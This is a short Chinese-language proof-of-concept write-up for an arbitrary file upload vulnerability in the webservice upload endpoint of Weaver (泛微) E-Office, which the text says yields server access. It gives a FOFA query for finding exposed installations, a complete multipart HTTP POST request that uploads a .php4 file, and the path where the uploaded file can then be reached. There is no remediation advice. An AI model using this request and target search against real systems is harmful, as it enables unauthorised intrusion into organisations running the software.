## 泛微-eoffice-webservice-file-upload任意文件上传漏洞

泛微/webservice/upload/upload.php接口存在任意文件上传漏洞，导致获取服务器权限。

## fofa

```
app="泛微-EOffice"
```

## poc

```
POST /webservice/upload/upload.php HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept-Encoding: gzip, deflate, br
Content-Type:multipart/form-data; boundary=--------------------------553898708333958420021355

----------------------------553898708333958420021355
Content-Disposition: form-data; name="file"; filename="qq_test.php4"
Content-Type: application/octet-stream

qqtest
----------------------------553898708333958420021355--
```

![image-20240613103552387](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406131035498.png)

文件路径`http://127.0.0.1\attachment\文件名`